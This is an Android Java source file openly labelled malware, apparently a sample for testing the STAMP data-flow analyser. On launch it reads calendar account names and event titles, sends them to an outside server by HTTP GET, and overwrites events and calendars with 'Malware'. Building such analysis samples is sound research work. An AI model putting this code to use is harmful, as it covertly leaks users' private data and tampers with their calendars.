package stamp.stanford.malware;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;

import android.provider.CalendarContract;
import android.provider.CalendarContract.Calendars;
import android.provider.CalendarContract.Events;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.ContentUris;
import android.database.Cursor;
import android.content.Intent;
import android.net.Uri;

import java.io.IOException;
import java.net.MalformedURLException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class Malware extends Activity {

    private class LeakInfo extends AsyncTask<String, Void, Void> {

	@Override protected Void doInBackground(String... params) {
	    try {
		HttpClient client = new DefaultHttpClient();
		String getURL = "http://stanford.edu/~subodh/cgi-bin/stamp/id.php?cal=" + params[0];
		HttpGet get = new HttpGet(getURL);
		HttpResponse responseGet = client.execute(get);
		HttpEntity resEntityGet = responseGet.getEntity();
		if (resEntityGet != null) {
                    Log.i("GET RESPONSE",EntityUtils.toString(resEntityGet));
                }
	    } catch (MalformedURLException e) {
		e.printStackTrace();
	    } catch (IOException e) {
		e.printStackTrace();
	    }
	    return null;
	}
    }

    public static final String[] CALENDAR_PROJECTION = new String[] {
	Calendars._ID,
	Calendars.ACCOUNT_NAME,
	Calendars.CALENDAR_DISPLAY_NAME,
    };

    public static final String[] EVENT_PROJECTION = new String[] {
	Events._ID,
	Events.ORGANIZER,
	Events.TITLE,
    };

    private class CalendarQuery extends AsyncTask<String, Void, Void> {

	@Override protected Void doInBackground(String... params) {

	    // perform calendar reads
	    Cursor cur = null;
	    ContentResolver cr = getContentResolver();

	    Uri calendarUri = Calendars.CONTENT_URI;
	    String calendarSelection = "((" + Calendars.ACCOUNT_NAME + " = ?) AND ("
		+ Calendars.ACCOUNT_TYPE + " = ?))";
	    String[] calendarSelectionArgs = new String[] {"sampleuser@gmail.com", "com.google"};
	    cur = cr.query(calendarUri, CALENDAR_PROJECTION, calendarSelection, calendarSelectionArgs, null);

	    while(cur.moveToNext()) {
		long calID = cur.getLong(0);
		String accountName = cur.getString(1);
		String displayName = cur.getString(2);

		Uri eventUri = Events.CONTENT_URI;
		String eventsSelection = "((" + Events.CALENDAR_ID + " = ?))";
		String[] eventsSelectionArgs = new String[] {String.valueOf(calID)};
		cur = cr.query(eventUri, EVENT_PROJECTION, eventsSelection, eventsSelectionArgs, null);
		
		while(cur.moveToNext()) {
		    long eventID = cur.getLong(0);
		    String organizerName = cur.getString(1);
		    String eventTitle = cur.getString(2);
		    
		    new LeakInfo().execute(accountName + eventTitle);

		    // modify the calendar event, this is a new sink
		    ContentValues eventValues = new ContentValues();
		    eventValues.put(Events.TITLE, "Malware");
		    Uri eventUpdateUri = ContentUris.withAppendedId(Events.CONTENT_URI, eventID);
		    int rows = getContentResolver().update(eventUpdateUri, eventValues, null, null);
		}

		// insert malware event into the calendar
		ContentValues addEventValues = new ContentValues();
		addEventValues.put(Events.DTSTART, 0);
		addEventValues.put(Events.DTEND, 1000);
		addEventValues.put(Events.EVENT_TIMEZONE, "America/Los_Angeles");
		addEventValues.put(Events.CALENDAR_ID, calID);
		addEventValues.put(Events.TITLE, "malware");
		Uri addUri = cr.insert(Events.CONTENT_URI, addEventValues);

		// modify the calendar, this is another new sink
		ContentValues calendarValues = new ContentValues();
		calendarValues.put(Calendars.NAME, "Malware");
		calendarValues.put(Calendars.CALENDAR_DISPLAY_NAME, "Malware");

		Uri calendarUpdateUri = ContentUris.withAppendedId(Calendars.CONTENT_URI, calID);
		int rows = getContentResolver().update(calendarUpdateUri, calendarValues, null, null);
	    }

	    // insert malware event into calendar using intent
	    Intent intent = new Intent(Intent.ACTION_INSERT)
		.setData(Events.CONTENT_URI)
		.putExtra(CalendarContract.EXTRA_EVENT_BEGIN_TIME, 0)
		.putExtra(CalendarContract.EXTRA_EVENT_END_TIME, 1000)
		.putExtra(Events.TITLE, "malware");
	    startActivity(intent);
		
	    return null;
	}
    }

    @Override public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
	new CalendarQuery().execute("null");
        setContentView(R.layout.main);
    }

    @Override public void onStart(){
	super.onStart();
    }
}
